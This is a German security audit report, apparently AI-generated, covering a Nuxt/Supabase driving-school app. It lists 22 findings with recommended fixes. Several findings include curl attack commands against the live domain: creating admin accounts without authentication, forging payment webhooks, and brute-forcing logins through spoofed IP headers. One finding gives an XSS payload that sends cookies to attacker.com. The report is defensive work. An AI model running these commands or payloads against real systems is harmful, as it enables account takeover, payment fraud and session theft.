# Security Audit — Driving Team App
**Datum:** 26. April 2026  
**Scope:** Vollständige Codebase (`/Users/pascalkilchenmann/driving-team-app`)  
**Analyst:** Automated Security Review (Senior AppSec Engineer Persona)  
**Methodik:** White-Box Code Review, 60+ Dateien gelesen

---

## Executive Summary

Beim Audit dieser produktiven Nuxt 3 / Supabase Applikation wurden **22 Findings** identifiziert — davon **4 CRITICAL**, **8 HIGH** und **7 MEDIUM**. Die Applikation verfügt bereits über eine solide Grundstruktur (Rate Limiter, httpOnly-Cookies, Input-Validierung, Audit Logging, Supabase RLS), jedoch existieren mehrere schwerwiegende Lücken, die aktiv ausgenutzt werden könnten.

**Top-3 kritischste Probleme:**
1. **`/api/admin/users` — vollständig unauthentifiziert** (CRITICAL): Jeder kann ohne Login alle Userdaten lesen, Admin-Accounts erstellen, User löschen — kein einziger Auth-Check.
2. **Wallee Webhook ohne HMAC-Signatur-Verifikation** (CRITICAL): Angreifer können gefälschte Zahlungsbestätigungen senden und Bestellungen ohne Bezahlung bestätigen lassen.
3. **`/api/admin/error-logs-debug` — unauthentifiziert** (CRITICAL): Gibt 100 interne System-Error-Logs an jeden Besucher zurück.

---

## Risiko-Übersicht

| Severity | Anzahl |
|----------|--------|
| 🔴 CRITICAL | 4 |
| 🟠 HIGH | 8 |
| 🟡 MEDIUM | 7 |
| 🟢 LOW | 3 |

---

## Findings

---

### 🔴 CRITICAL — FINDING-001: Admin Users API vollständig unauthentifiziert

- **Datei:** `server/api/admin/users.post.ts:7-172`
- **Angriffstyp:** Broken Access Control / Missing Authorization
- **Beschreibung:** Der Endpunkt `/api/admin/users` führt keinerlei Authentifizierungs- oder Autorisierungsprüfung durch. Er akzeptiert einen `action`-Parameter und erlaubt das Lesen, Erstellen, Updaten und Löschen von Usern aller Tenants. Es gibt keinen `getAuthenticatedUser()`-Aufruf, kein Token-Check, keinen Role-Check.
- **Angriffsvector:**
  ```bash
  # Alle Admins eines Tenants auflisten (kein Token nötig):
  curl -X POST https://simy.ch/api/admin/users \
    -H "Content-Type: application/json" \
    -d '{"action":"get-admins","tenant_id":"<uuid>"}'

  # Neuen Admin-Account anlegen:
  curl -X POST https://simy.ch/api/admin/users \
    -H "Content-Type: application/json" \
    -d '{"action":"create-admin","user_data":{"email":"hacker@evil.com","role":"admin","tenant_id":"<uuid>","is_active":true}}'

  # Beliebigen User über ID updaten (Mass Assignment):
  curl -X POST https://simy.ch/api/admin/users \
    -H "Content-Type: application/json" \
    -d '{"action":"update-admin","user_id":"<uuid>","user_data":{"role":"super_admin","is_active":true}}'
  ```
  Die `update-admin` und `update-staff` Actions übergeben `user_data` direkt an `.update(user_data)` ohne Column-Whitelist → vollständige Mass Assignment.
- **Empfohlener Fix:**
  ```typescript
  export default defineEventHandler(async (event) => {
    const authUser = await getAuthenticatedUser(event)
    if (!authUser) throw createError({ statusCode: 401, statusMessage: 'Unauthorized' })

    const supabase = getSupabaseAdmin()
    const { data: profile } = await supabase
      .from('users').select('id, role, tenant_id')
      .eq('auth_user_id', authUser.id).single()
    if (!profile || !['admin', 'super_admin'].includes(profile.role)) {
      throw createError({ statusCode: 403, statusMessage: 'Forbidden' })
    }
    // ... rest of handler, mit Tenant-Isolation und Column-Whitelist
  ```
  Zusätzlich: Column-Whitelist für `user_data` bei Update/Insert implementieren.

---

### 🔴 CRITICAL — FINDING-002: Wallee Webhook ohne Signaturverifikation

- **Datei:** `server/api/wallee/webhook.post.ts:13,68-113`
- **Angriffstyp:** Broken Authentication / Business Logic
- **Beschreibung:** Der Wallee Payment Webhook verarbeitet eingehende Zahlungsnotifikationen (FULFILL, COMPLETED etc.) ohne die Signatur kryptographisch zu verifizieren. Im Code steht explizit: `// crypto import removed - using static token validation instead of HMAC`. Es findet **keinerlei Signatur-Prüfung** statt (Layer 0 ist optional und leer). Jeder kann einen gefälschten Webhook senden.
- **Angriffsvector:**
  ```bash
  # Gefälschte Zahlungsbestätigung für eigene Bestellung senden:
  curl -X POST https://simy.ch/api/wallee/webhook \
    -H "Content-Type: application/json" \
    -d '{"entityId":12345678,"state":"FULFILL","spaceId":82592,"listenerEntityId":1,"listenerEntityTechnicalName":"Payment","timestamp":"2026-04-26T05:00:00Z"}'
  ```
  Das System würde daraufhin die Zahlung als `completed` markieren, Kursregistrierungen erstellen, Voucher ausstellen und SARI-Einschreibungen durchführen.
- **Empfohlener Fix:** Wallee bietet HMAC-basierte Webhook-Signaturverifizierung. Implementierung:
  ```typescript
  import crypto from 'crypto'

  const signature = getHeader(event, 'x-wallee-signature')
  const webhookSecret = process.env.WALLEE_WEBHOOK_SECRET
  if (!signature || !webhookSecret) {
    throw createError({ statusCode: 401, statusMessage: 'Missing signature' })
  }
  const rawBody = await readRawBody(event)
  const expectedSig = crypto
    .createHmac('sha256', webhookSecret)
    .update(rawBody)
    .digest('hex')
  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSig))) {
    throw createError({ statusCode: 401, statusMessage: 'Invalid webhook signature' })
  }
  ```

---

### 🔴 CRITICAL — FINDING-003: Error Logs Debug-Endpoint unauthentifiziert

- **Datei:** `server/api/admin/error-logs-debug.get.ts:4-46`
- **Angriffstyp:** Information Disclosure / Missing Authorization
- **Beschreibung:** `/api/admin/error-logs-debug` liest mit dem Service-Role-Key (bypass RLS) die letzten 100 Einträge aus `error_logs` und gibt diese ohne jede Authentifizierung zurück. Error-Logs enthalten typischerweise Stack-Traces, interne Pfade, User-IDs, E-Mail-Adressen und Datenbankfehlermeldungen.
- **Angriffsvector:**
  ```bash
  curl https://simy.ch/api/admin/error-logs-debug
  # → 100 system error logs mit internen Informationen
  ```
- **Empfohlener Fix:** Endpoint entweder vollständig entfernen (nur in dev verfügbar) oder denselben Auth-Check wie `/api/admin/error-logs.get.ts` implementieren (Admin-Rolle erforderlich). Idealerweise: Endpoint aus Produktions-Build ausschliessen via `process.env.NODE_ENV !== 'production'`-Guard.

---

### 🔴 CRITICAL — FINDING-004: `admin/manage.post.ts` mit ungültigem Auth-Pattern (broken reference)

- **Datei:** `server/api/admin/manage.post.ts:22`
- **Angriffstyp:** Broken Authentication
- **Beschreibung:** Der Handler referenziert auf Zeile 22 `session.user.id`, aber `session` ist im gesamten File nirgends definiert oder importiert. Das bedeutet: (a) Jeder Aufruf wirft einen `ReferenceError`, was die Evaluation-System-APIs bricht, ODER (b) durch Hoisting/globale Variablen könnte `session` aus einem anderen Scope stammen, was zu unberechtigtem Zugriff führen kann. Es gibt keinen `getAuthenticatedUser()`-Aufruf.
- **Angriffsvector:** Wenn `session` undefined ist, würde die Funktion sofort einen Error werfen — dies ist ein funktionaler Bug. Wenn es jedoch irgendwie zu einem globalen `session`-Objekt auflöst, kann jeder authenticierte User Evaluation-Kategorien anderer Tenants bearbeiten.
- **Empfohlener Fix:** Den Handler vollständig umschreiben mit korrektem Auth-Check:
  ```typescript
  export default defineEventHandler(async (event) => {
    const authUser = await getAuthenticatedUser(event)
    if (!authUser) throw createError({ statusCode: 401, statusMessage: 'Unauthorized' })
    // Dann profile aus DB laden, role prüfen, userId weitergeben
  ```

---

### 🟠 HIGH — FINDING-005: Rate Limiter IP-Spoofing via `x-forwarded-for`

- **Datei:** `server/utils/rate-limiter.ts:128` / `server/api/auth/login.post.ts:31-34` / `server/middleware/rate-limiting.ts:106-120`
- **Angriffstyp:** Rate Limiting Bypass / DoS
- **Beschreibung:** Alle Rate Limiter extrahieren die Client-IP direkt aus dem `x-forwarded-for` Header ohne zu prüfen, ob dieser vertrauenswürdig ist. Ein Angreifer kann beliebige IPs vortäuschen und damit den Rate Limiter komplett umgehen.
- **Angriffsvector:**
  ```bash
  # Brute-Force Login ohne Rate Limiting:
  for i in $(seq 1 1000); do
    curl -X POST https://simy.ch/api/auth/login \
      -H "X-Forwarded-For: 10.0.0.$i" \
      -H "Content-Type: application/json" \
      -d '{"email":"victim@example.com","password":"guess'$i'"}'
  done
  ```
- **Empfohlener Fix:** Auf Vercel/Nginx sollte nur die letzte IP aus `x-forwarded-for` oder der `x-real-ip` Header verwendet werden, da der Proxy diese setzt. Besser: Konfiguriere Vercel/Nginx als trusted proxy und lese nur von dort die IP. Alternativ: Kombiniere IP + User-Agent-Hash als Rate-Limit-Key.

---

### 🟠 HIGH — FINDING-006: Login-Endpoint gibt JWT-Tokens im Response Body zurück

- **Datei:** `server/api/auth/login.post.ts:748-765`
- **Angriffstyp:** Sensitive Data Exposure / Broken Authentication
- **Beschreibung:** Obwohl die Tokens korrekt als httpOnly-Cookies gesetzt werden (Schutz gegen XSS), werden `access_token` und `refresh_token` **zusätzlich** im JSON-Response-Body zurückgegeben. Dadurch sind die Tokens für JavaScript (und damit potenzielle XSS-Angriffe) zugänglich. Auch werden sie in Browser-Logs und Netzwerk-Tab sichtbar.
  ```typescript
  session: {
    access_token: data.session.access_token,    // ← im Body!
    refresh_token: data.session.refresh_token,  // ← im Body!
  ```
- **Angriffsvector:** Bei einem XSS-Angriff (z.B. via gespeicherter XSS in einem Blog-Post oder Kommentar) kann der Angreifer via `fetch('/api/auth/login', ...).then(r => r.json())` vorhandene Token stehlen, oder wenn der Login-Request in einem Netzwerk-Log landet.
- **Empfohlener Fix:** Tokens nur in httpOnly-Cookies setzen. Im Response Body nur nicht-sensitives zurückgeben:
  ```typescript
  return {
    success: true,
    user: { id: data.user.id, email: data.user.email },
    profile: userProfile,
    rememberMe,
    // KEINE access_token/refresh_token im Body
  }
  ```

---

### 🟠 HIGH — FINDING-007: `encrypt-secrets-migration-dev` Endpoint in Produktion aktiv

- **Datei:** `server/api/admin/encrypt-secrets-migration-dev.post.ts:1-79`
- **Angriffstyp:** Security Misconfiguration / Sensitive Data Exposure
- **Beschreibung:** Ein als "DEV ONLY" kommentierter Endpoint ist in der Produktion deployed. Er akzeptiert einen `X-Migration-Secret` Header und führt bei gültigem Secret eine Verschlüsselungsmigration aller Tenant-Secrets durch. Der Secret wird gegen `MIGRATION_SECRET_KEY || ENCRYPTION_KEY` geprüft — das heisst, wer den Encryption Key kennt (z.B. aus einem Leak), kann diesen Endpoint triggern und dabei Secrets im Klartext sehen (da `checkEncryptionStatus()` aufgerufen wird).
- **Angriffsvector:**
  ```bash
  curl -X POST https://simy.ch/api/admin/encrypt-secrets-migration-dev \
    -H "X-Migration-Secret: <leaked-encryption-key>" \
    # → Response enthält statusBefore mit plaintext secret count und details
  ```
- **Empfohlener Fix:** Den Endpoint vollständig aus dem Produktions-Build entfernen. Falls er lokal benötigt wird, via Environment Guard absichern:
  ```typescript
  if (process.env.NODE_ENV === 'production') {
    throw createError({ statusCode: 404, statusMessage: 'Not found' })
  }
  ```

---

### 🟠 HIGH — FINDING-008: `admin/test-db-connection` unauthentifiziert

- **Datei:** `server/api/admin/test-db-connection.post.ts:1-45`
- **Angriffstyp:** Information Disclosure / Missing Authorization
- **Beschreibung:** Dieser Endpoint führt ohne jegliche Authentifizierung eine Test-Query gegen die `tenant_secrets` Tabelle aus und bestätigt erfolgreichen DB-Zugriff. Im Fehlerfall gibt er die Datenbankfehlermeldung direkt zurück (`statusMessage: \`Database connection failed: ${error.message}\``). Dies kann interne Datenbankstrukturinformationen preisgeben.
- **Angriffsvector:**
  ```bash
  curl -X POST https://simy.ch/api/admin/test-db-connection
  # → {"success":true,"message":"Database connection working","timestamp":"..."}
  # Bestätigt dass: DB erreichbar, tenant_secrets Tabelle existiert
  ```
- **Empfohlener Fix:** Entweder komplett entfernen oder mit Super-Admin-Auth sichern. Zumindest den Endpoint nur in Development aktivieren.

---

### 🟠 HIGH — FINDING-009: Website Debug-Endpoints ohne Auth

- **Datei:** `apps/website/server/api/analytics-debug.get.ts` / `apps/website/server/api/blog-debug.get.ts` / `apps/website/server/api/track-debug.get.ts`
- **Angriffstyp:** Information Disclosure
- **Beschreibung:** Drei Debug-Endpoints der öffentlichen Website sind ohne Authentifizierung zugänglich:
  - `analytics-debug`: Gibt Supabase URL-Status und RPC-Verfügbarkeit zurück
  - `blog-debug`: Gibt `process.cwd()` (Serverpfad), alle Blog-Slugs und Stack-Traces bei Fehlern zurück
  - `track-debug`: Gibt Supabase-Konfigurationsstatus und `VERCEL_ENV` zurück
- **Angriffsvector:** `blog-debug` gibt bei Errors `err.stack?.slice(0, 500)` zurück, was interne Dateipfade, Node.js-Versionsinformationen und Modulstruktur offenbaren kann.
- **Empfohlener Fix:** Alle drei Endpoints in Produktion deaktivieren:
  ```typescript
  if (process.env.NODE_ENV === 'production') {
    throw createError({ statusCode: 404 })
  }
  ```

---

### 🟠 HIGH — FINDING-010: `database/query` Endpoint exponiert `calendar_tokens` mit Token-Column

- **Datei:** `server/api/database/query.post.ts:106`
- **Angriffstyp:** IDOR / Sensitive Data Exposure
- **Beschreibung:** Der generische Query-Endpunkt erlaubt authentifizierten Usern, auf whitegelistete Tabellen zuzugreifen. Problematisch: `calendar_tokens` ist whitegelistet und enthält die Spalte `token`. Ein eingeloggter User (jede Rolle!) kann Kalender-Tokens anderer Mitarbeitenden abfragen — sofern die RLS-Policies dies erlauben. Das würde unbefugten Zugriff auf Kalender-Feeds ermöglichen.
  ```typescript
  calendar_tokens: ['id', 'staff_id', 'tenant_id', 'token', 'expires_at', 'created_at'],
  ```
- **Angriffsvector:**
  ```json
  POST /api/database/query
  {"action":"select","table":"calendar_tokens","filters":[{"column":"tenant_id","operator":"eq","value":"<tenant-uuid>"}]}
  ```
- **Empfohlener Fix:** `token`-Spalte aus dem Whitelist entfernen. Kalender-Tokens sollten nur über dedizierte Endpoints mit expliziter Autorisierung zugänglich sein.

---

### 🟠 HIGH — FINDING-011: Rate Limiter "Fail Open" Pattern

- **Datei:** `server/utils/rate-limiter.ts:146-151`
- **Angriffstyp:** Rate Limiting Bypass / DoS
- **Beschreibung:** Der Rate Limiter fällt bei Supabase-Fehler (`if (!supabase)`) auf "allow all" zurück. Das bedeutet: Bei einer Supabase-Ausfallzeit oder Rate-Limit der DB selbst können Angreifer unbegrenzte Login-Versuche oder Payment-Requests machen.
  ```typescript
  if (!supabase) {
    // Fallback to in-memory if Supabase not available
    return allowed  // ← erlaubt ALLE Requests
  }
  ```
  Der In-Memory-Fallback `requestCache` wird nur beim `cached && cached.resetTime > now`-Check verwendet, nicht als Fallback bei DB-Fehler.
- **Empfohlener Fix:** "Fail Secure" statt "Fail Open": Bei DB-Fehler In-Memory-Rate-Limiting aktivieren. Mindestens den progressiven Rate Limiter als Fallback nutzen.

---

### 🟠 HIGH — FINDING-012: Mass Assignment in `admin/users.post.ts`

- **Datei:** `server/api/admin/users.post.ts:50-54,98-108`
- **Angriffstyp:** Mass Assignment / Parameter Pollution
- **Beschreibung:** Die `update-admin`, `update-staff` und theoretisch auch `create-admin`/`create-staff` Actions übergeben `user_data` direkt und ungefiltert an Supabase ohne eine Column-Whitelist. Ein Angreifer (der Note: noch immer kein Auth benötigt, siehe FINDING-001) kann beliebige Felder setzen, z.B. `role`, `is_active`, `tenant_id`, `auth_user_id`.
  ```typescript
  const { data, error } = await supabase
    .from('users')
    .update(user_data)  // ← user_data direkt aus Request-Body
    .eq('id', user_id)
  ```
- **Empfohlener Fix:**
  ```typescript
  const ALLOWED_UPDATE_FIELDS = ['first_name', 'last_name', 'phone', 'is_active']
  const safeData = Object.fromEntries(
    Object.entries(user_data).filter(([k]) => ALLOWED_UPDATE_FIELDS.includes(k))
  )
  ```

---

### 🟡 MEDIUM — FINDING-013: Content-Security-Policy mit `unsafe-inline` für Scripts

- **Datei:** `nuxt.config.ts:78`
- **Angriffstyp:** XSS (Cross-Site Scripting) — fehlende Härtung
- **Beschreibung:** Die CSP erlaubt `script-src 'self' 'unsafe-inline' ...`. `unsafe-inline` macht die gesamte XSS-Schutzfunktion der CSP wirkungslos — inline `<script>`-Tags und `javascript:` URLs sind erlaubt. Dadurch wird jede gespeicherte XSS-Schwachstelle direkt ausnutzbar.
- **Angriffsvector:** Wenn irgendwo in der App User-Content ohne korrekte Escaping gerendert wird (z.B. in Email-Templates, Admin-Kommentaren), kann der Angreifer `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>` injizieren.
- **Empfohlener Fix:** CSP auf Nonce-basierte Inline-Scripts migrieren. Für Nuxt 3:
  ```typescript
  // nuxt.config.ts
  security: {
    headers: {
      contentSecurityPolicy: {
        'script-src': ["'self'", "'nonce-{{nonce}}'", ...],
      }
    }
  }
  ```
  Package `nuxt-security` verwenden.

---

### 🟡 MEDIUM — FINDING-014: `credit/adjust` — keine Obergrenze für Guthabensbetrag

- **Datei:** `server/api/admin/credit/adjust.post.ts:48-50`
- **Angriffstyp:** Business Logic Flaw
- **Beschreibung:** Die Validierung prüft nur, dass `amountRappen > 0` ist. Es gibt keine maximale Obergrenze. Ein Admin (legitimiert) könnte einem User beliebig grosse Guthaben-Beträge gutschreiben (z.B. CHF 999'999). Bei kompromittierten Admin-Accounts ist das finanziell kritisch.
  ```typescript
  if (!amountRappen || typeof amountRappen !== 'number' || amountRappen <= 0) {
  ```
- **Empfohlener Fix:**
  ```typescript
  const MAX_ADJUSTMENT_RAPPEN = 100_000_00 // CHF 100'000
  if (amountRappen > MAX_ADJUSTMENT_RAPPEN) {
    errors.amountRappen = 'Betrag überschreitet das Maximum von CHF 100\'000'
  }
  ```
  Zusätzlich: Saldo-Obergrenzen und Approval-Workflows für grosse Beträge.

---

### 🟡 MEDIUM — FINDING-015: `admin/users` search-users — Wildcard-Injection

- **Datei:** `server/api/admin/users.post.ts:140-141`
- **Angriffstyp:** SQL Injection (limitiert — Wildcard Injection via ILIKE)
- **Beschreibung:** Der `search_term` wird direkt in ein `ilike`-Pattern eingebaut:
  ```typescript
  .or(`email.ilike.%${search_term}%,...`)
  ```
  Zwar nutzt Supabase parameterisierte Queries (kein klassisches SQL Injection), aber ein Angreifer kann durch massive Wildcards wie `%a%a%a%a%a%...` exponentiell teure LIKE-Queries erzeugen (ReDoS-ähnliches Pattern). Kombiniert mit fehlendem Auth (FINDING-001) ergibt das eine DoS-Möglichkeit.
- **Empfohlener Fix:**
  ```typescript
  const sanitizedSearch = search_term.replace(/[%_\\]/g, '\\$&').substring(0, 100)
  ```
  Und Rate Limiting auf diesen Endpoint.

---

### 🟡 MEDIUM — FINDING-016: Cookies mit `sameSite: 'lax'` statt `'strict'`

- **Datei:** `server/utils/cookies.ts:36`
- **Angriffstyp:** CSRF (Cross-Site Request Forgery)
- **Beschreibung:** Auth-Cookies werden mit `sameSite: 'lax'` gesetzt. Lax erlaubt das Mitsenden von Cookies bei Top-Level-Navigation (GET-Redirects). Für POST-basierte CSRF-Angriffe bietet lax zwar Schutz, aber bei GET-Endpoints (z.B. `/api/admin/error-logs`) wird der Cookie mitgesendet.
  ```typescript
  sameSite: 'lax',  // Kommentar: "strict würde OAuth breaks"
  ```
- **Empfohlener Fix:** Prüfen ob `strict` für die Anwendungsfälle möglich ist. Wo OAuth-Redirects `lax` erfordern, nur die spezifischen OAuth-Callbacks ausklammern. Alternativ CSRF-Tokens für State-Changing-Operationen einführen.

---

### 🟡 MEDIUM — FINDING-017: `admin/get-tenant-users` gibt `select('*')` mit sensiblen Feldern zurück

- **Datei:** `server/api/admin/get-tenant-users.get.ts:56-67,76-83`
- **Angriffstyp:** Sensitive Data Exposure / IDOR
- **Beschreibung:** Für `super_admin` werden **alle** User mit `select('*')` zurückgegeben, für Admins alle Tenant-User mit `select('*')`. Das `*` schliesst potenziell sensitive Felder ein wie `password_strength_version`, `auth_user_id`, Adressen, Geburtsdaten etc. Auch `staff`-Rolle hat Zugriff auf alle Tenant-User via diesen Endpoint (Zeile 49: `['staff', 'admin', 'tenant_admin', 'super_admin']`).
- **Empfohlener Fix:** Explizite Spalten-Liste statt `*`:
  ```typescript
  .select('id, first_name, last_name, email, phone, role, is_active, created_at, tenant_id')
  ```

---

### 🟡 MEDIUM — FINDING-018: Wallee Webhook verarbeitet Payment ohne Betrag-Validierung

- **Datei:** `server/api/wallee/webhook.post.ts:402-425`
- **Angriffstyp:** Business Logic Flaw
- **Beschreibung:** Wenn ein Wallee Webhook eine FULFILL-Meldung sendet, wird der Payment-Status auf `completed` gesetzt, ohne den tatsächlich gezahlten Betrag gegen den erwarteten Betrag zu validieren. Wenn Wallee-seitig eine Transaktion mit falschem Betrag bestätigt wird (z.B. bei einer Konfigurationsfehler), würde die App die Bestellung trotzdem als vollständig bezahlt markieren.
- **Empfohlener Fix:** Beim Webhook den Transaktionsbetrag aus der Wallee API abrufen (wird in `fetchWalleeTransaction` bereits gemacht) und gegen `payment.total_amount_rappen` validieren, bevor der Status auf `completed` gesetzt wird.

---

### 🟡 MEDIUM — FINDING-019: `admin/manage.post.ts` leakt Supabase Errors direkt

- **Datei:** `server/api/admin/manage.post.ts:50-56`
- **Angriffstyp:** Information Disclosure
- **Beschreibung:** Datenbankfehler werden ungefiltert zurückgegeben:
  ```typescript
  return {
    success: false,
    error: err.message || 'Operation failed'  // ← DB-Fehlermeldungen an Client
  }
  ```
  Supabase-Fehlermeldungen können Schema-Informationen, Constraint-Namen und interne Tabellenstrukturen enthalten.
- **Empfohlener Fix:** Generische Fehlermeldungen zurückgeben, detaillierte Fehler nur serverseitig loggen:
  ```typescript
  console.error('Admin manage error:', err)
  return { success: false, error: 'Vorgang fehlgeschlagen. Bitte versuchen Sie es erneut.' }
  ```

---

### 🟢 LOW — FINDING-020: Tokens im Login-Flow über HTTP-Header gelesen (schwache Isolation)

- **Datei:** `server/middleware/01.auth-cookie-to-header.ts:8-21`
- **Angriffstyp:** Session Hijacking (Risiko-Verstärker)
- **Beschreibung:** Das Middleware kopiert den Cookie-Wert in den Authorization-Header via `event.node.req.headers.authorization = 'Bearer ' + accessToken`. Obwohl Request-interne Header-Manipulation serverseitig sicher ist, kann dies mit Logging-Middleware oder Request-Forwarding zu unbeabsichtigter Token-Exposition in Logs führen.
- **Empfohlener Fix:** Gut dokumentieren, dass dieser Header nur intern verwendet wird. Sicherstellen dass keine Request-Logging-Middleware diesen Header loggt.

---

### 🟢 LOW — FINDING-021: TypeScript `strict: false` in `nuxt.config.ts`

- **Datei:** `nuxt.config.ts:49-50`
- **Angriffstyp:** Secure Coding / Type Confusion
- **Beschreibung:** Mit `strict: false` und `typeCheck: false` werden potenzielle Type-Confusion-Bugs nicht zur Compile-Zeit erkannt. In Security-kritischem Code (Auth-Checks, Payment-Verarbeitung) können Typ-Verwechslungen zu Bypass-Möglichkeiten führen.
- **Empfohlener Fix:** `strict: true` aktivieren und TypeScript-Fehler systematisch beheben.

---

### 🟢 LOW — FINDING-022: `process-public.post.ts` ohne Rate Limiting

- **Datei:** `server/api/payments/process-public.post.ts:37-100`
- **Angriffstyp:** Rate Limiting / DoS
- **Beschreibung:** Der öffentliche Payment-Endpoint (für Kursanmeldungen ohne Login) hat kein Rate Limiting implementiert. Ein Angreifer könnte hunderte Wallee-Transaktionen pro Minute erstellen und so Wallee-API-Limits ausschöpfen oder Spam-Registrierungen erzeugen.
- **Empfohlener Fix:** `checkRateLimit(ipAddress, 'process_payment_public', 5, 60000)` hinzufügen. (Der authentifizierte Endpoint `process.post.ts` hat bereits Rate Limiting via `LIMITS.process_payment`.)

---

## Was gut ist (Positive Findings)

1. **Solide Auth-Infrastruktur**: `getAuthenticatedUser()` mit Cookie + Header-Fallback, Token-Refresh-Logik und Supabase JWT-Verifikation — gut implementiert in den meisten Endpoints.

2. **httpOnly-Cookies korrekt gesetzt**: `setAuthCookies()` setzt Access- und Refresh-Token als httpOnly, secure (in Prod), mit korrektem sameSite.

3. **Rate Limiter vorhanden**: Persistenter Rate Limiter mit Supabase-Backend, Exponential Backoff, IP-Blocking und separaten Limits für Login (10/min), Register (5/min), Payments (20/min).

4. **Password-Strength-Validierung**: `validatePassword()` mit HIBP-Check, Längenprüfung, Complexity-Anforderungen und `password_strength_version`-Upgrade.

5. **Tenant-Isolation in kritischen Endpoints**: Die meisten authentifizierten Admin-Endpoints prüfen `tenant_id` Matching (z.B. `save-tenant-secrets`, `credit/adjust`, `users/manage`).

6. **AES-256-CBC Verschlüsselung für Secrets**: Tenant-Secrets werden mit zufälligem IV verschlüsselt gespeichert.

7. **Audit Logging**: `logAudit()` wird in kritischen Endpoints verwendet (credit/adjust, save-tenant-secrets, users/manage).

8. **Supabase RLS**: Zahlreiche SQL-Migrations-Dateien im Repo zeigen aktive RLS-Pflege und Security-Awareness.

9. **Security Headers**: `nuxt.config.ts` setzt HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy.

10. **Input Validierung**: `server/utils/validators.ts`, Zod-Schema in `process-public.post.ts`, Email-Regex-Validierung in mehreren Endpoints.

11. **Cron-Job Security**: Cron-Endpoints prüfen `CRON_SECRET` via Authorization-Header.

12. **Device Fingerprinting & Suspicious Login Detection**: Neues Gerät löst Verifikations-E-Mail aus; Geolocation-basierte Anomalie-Erkennung implementiert.

13. **MFA-Support**: `send-mfa-code`, `verify-mfa-login`, WebAuthn-Integration vorhanden.

14. **Super Admin Isolation**: `tenants-manage.ts` und andere kritische Endpoints prüfen `super_admin`-Rolle.

---

## Priorisierte To-Do Liste

### 🚨 Sofort (vor nächstem Deploy — heute noch)

1. **FINDING-001 fixen**: `server/api/admin/users.post.ts` — Auth + Role-Check + Column-Whitelist hinzufügen.
2. **FINDING-003 fixen**: `server/api/admin/error-logs-debug.get.ts` — Entweder löschen oder Auth-Check hinzufügen.
3. **FINDING-004 fixen**: `server/api/admin/manage.post.ts` — Fehlendes `getAuthenticatedUser()` implementieren, `session.user.id` Referenz entfernen.
4. **FINDING-002 fixen**: Wallee Webhook HMAC-Signaturverifikation implementieren. Wallee-Doku für Signature-Verification konsultieren.
5. **FINDING-008 fixen**: `server/api/admin/test-db-connection.post.ts` — Endpoint mit Auth sichern oder löschen.
6. **FINDING-007 fixen**: `server/api/admin/encrypt-secrets-migration-dev.post.ts` — Production-Guard oder Löschen.

### ⚡ Kurzfristig (diese Woche)

1. **FINDING-006**: Login-Response-Body bereinigen — Tokens nur in Cookies, nicht im Body zurückgeben.
2. **FINDING-009**: Website Debug-Endpoints deaktivieren (analytics-debug, blog-debug, track-debug) in Produktion.
3. **FINDING-005**: IP-Spoofing in Rate Limitern adressieren — nur Vercel-trusted IPs akzeptieren.
4. **FINDING-010**: `calendar_tokens.token` aus Database-Query-Whitelist entfernen.
5. **FINDING-011**: Rate Limiter Fail-Secure implementieren — bei DB-Fehler In-Memory-Fallback nutzen.
6. **FINDING-012**: Mass Assignment in `admin/users.post.ts` beheben (Teil von FINDING-001 Fix).

### 📋 Mittelfristig (diesen Monat)

1. **FINDING-013**: CSP `unsafe-inline` mit Nonce-basierter Policy ersetzen (nuxt-security Package).
2. **FINDING-014**: Maximalen Anpassungsbetrag für Guthaben einführen.
3. **FINDING-015**: `search_term` Sanitierung in users-Suche.
4. **FINDING-017**: `select('*')` durch explizite Spalten-Listen ersetzen.
5. **FINDING-018**: Betrag-Validierung im Wallee Webhook hinzufügen.
6. **FINDING-021**: TypeScript `strict: true` aktivieren und Fehler beheben.
7. **FINDING-022**: Rate Limiting auf `process-public.post.ts` ergänzen.

---

## Technische Details & Architektur-relevante Security-Hinweise

### Nuxt 3 SSR Attack Surface
Die App nutzt `ssr: false` (reines SPA-Modus für den Admin-Teil), was die SSR-bezogene Server-Side Template Injection Risiken reduziert. Der Website-Teil (`apps/website`) ist ein separates Nuxt-App-Instanz und rendert öffentliche Seiten.

### Supabase RLS
Die RLS-Konfiguration wurde aktiv gepflegt (zahlreiche `.sql`-Migrations-Dateien). Kritisch: Die generische `database/query.post.ts` API verwendet den User-JWT und respektiert damit RLS — das ist positiv. Jedoch existieren zahlreiche Endpoints die `getSupabaseAdmin()` (Service Role, bypass RLS) verwenden — dort muss die Autorisierung vollständig im Anwendungscode implementiert sein.

### Wallee Payment Integration
Die Wallee-Integration ist komplex und verarbeitet Zahlungen in einem Multi-Schritt-Prozess (create transaction → redirect → webhook). Die fehlende Webhook-Signaturverifizierung ist das grösste unmittelbare Risiko im Zahlungsfluss.

### Token-Dualität (Cookie + Body)
Die App setzt Tokens sowohl als httpOnly-Cookie (für Server-Side API-Calls) als auch im Response-Body (für Client-Side Supabase-SDK). Dieses Pattern hat historische Gründe (Supabase-SDK benötigt den Token für Client-seitige RLS-Queries). Die Lösung: Client-Supabase-SDK mit dem `auth` Modus konfigurieren der Cookies liest, nicht Tokens aus dem Body.

### Email-Inhalte
Mehrere Email-Templates rendern User-Input direkt in HTML (z.B. `contact.post.ts` rendert `${notes}` im Email-Body). Da der `notes`-String vor dem Einbetten nicht HTML-escaped wird, könnte ein Angreifer HTML-Injection in der Admin-Email auslösen. Dies ist kein Server-seitiges XSS, aber Email-Client-seitiges HTML-Injection ist möglich. Empfehlung: Alle User-Inputs in Email-Templates mit `htmlEncode()` versehen.

### Tenant-UUID als Autorisierungs-Basis
Viele Endpoints authentifizieren sich durch Übereinstimmung von `tenant_id`. Da UUIDs zufällig und nicht vorhersagbar sind, ist Tenant-Enumeration schwierig — aber nicht unmöglich wenn Tenant-IDs anderweitig exponiert werden (z.B. in öffentlichen API-Responses).

### Credential-Speicherung
- `SUPABASE_SERVICE_ROLE_KEY`: Serverseitig, korrekt als Env-Variable
- `ENCRYPTION_KEY`: Als Env-Variable für Secret-Verschlüsselung — gut
- `WALLEE_SECRET_KEY`: Als Env-Variable — gut
- `RESEND_API_KEY`: Als Env-Variable — gut
- `CRON_SECRET`: Als Env-Variable für Cron-Authentication — gut

Keine hardcodierten Credentials in der Codebase gefunden (ausser `TENANT_ID` und `TEAM_EMAIL` als Konstanten in `contact.post.ts` — niedrig-kritisch, da keine Secrets).
